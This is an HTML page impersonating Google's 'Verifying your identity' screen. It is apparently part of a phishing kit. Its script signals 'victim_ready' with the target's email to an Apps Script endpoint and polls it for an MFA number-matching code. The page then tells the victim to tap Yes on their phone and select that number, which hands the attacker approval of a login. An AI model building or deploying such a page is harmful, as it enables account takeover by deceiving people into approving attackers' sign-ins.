<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifying your identity - Google</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="page-center">
    <div class="card">
      <div class="logo">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
          <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
          <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
        </svg>
      </div>

      <div class="avatar" id="avatar"></div>

      <div id="loading">
        <div class="spinner"></div>
        <h1>Verifying your identity</h1>
        <p id="statusText">Connecting to Google... Please wait</p>
      </div>

      <div id="prompt-section" style="display:none;">
        <h1>Check your phone</h1>
        <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
        <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
        <div id="matchNumber" class="number-box">••</div>
        <p id="statusText2" style="margin-top:24px; color:#34a853; font-weight:500;">Waiting for confirmation...</p>
      </div>

      <p id="debugMsg" style="color:#d93025; font-size:14px; margin-top:32px; min-height:40px;"></p>
    </div>
  </div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzkn1lBC4-5TzONsqyC4rAQ9OZB4A6oES9v6rE7jnXxfuD3TuuWXcJJNAWK3XSG29-w/exec";

    // Get email — fallback if localStorage is empty
    let email = localStorage.getItem("demoEmail") || "test@example.com";
    if (!email || email === "someone@example.com") {
      document.getElementById("debugMsg").textContent = "Warning: No email found. Using test value.";
    }

    document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();

    // Tell server we are here
    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
      method: "GET",
      mode: "no-cors"
    });

    // Poll every 5 seconds — very simple version
    function checkForNumber() {
      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;

      fetch(url, { cache: "no-cache" })
        .then(response => response.text())
        .then(text => {
          // Very simple check — look for digits only
          const match = text.match(/"prompt_number":"(\d+)"/);
          let number = "";
          if (match && match[1]) {
            number = match[1];
          }

          if (number && number.length >= 1 && number !== "null" && number !== "") {
            document.getElementById("matchNumber").textContent = number;
            document.getElementById("statusText").textContent = "Number received!";
            document.getElementById("statusText2").textContent = "Tap Yes on your phone and select this number";
            document.getElementById("loading").style.display = "none";
            document.getElementById("prompt-section").style.display = "block";
            document.getElementById("debugMsg").textContent = "";
          } else {
            document.getElementById("statusText").textContent = "Still waiting for number...";
            document.getElementById("debugMsg").textContent = "No number yet (trying again soon)";
          }
        })
        .catch(err => {
          document.getElementById("statusText").textContent = "Connection problem";
          document.getElementById("debugMsg").textContent = "Error: " + err.message;
        });
    }

    // Start polling
    setInterval(checkForNumber, 5000);

    // Run once immediately
    checkForNumber();

    // Fallback: if nothing happens after 60 seconds, show test number
    setTimeout(() => {
      if (document.getElementById("matchNumber").textContent === "••") {
        document.getElementById("matchNumber").textContent = "66";
        document.getElementById("statusText").textContent = "Test number shown (server may be slow)";
        document.getElementById("loading").style.display = "none";
        document.getElementById("prompt-section").style.display = "block";
      }
    }, 60000);
  </script>
</body>
</html>
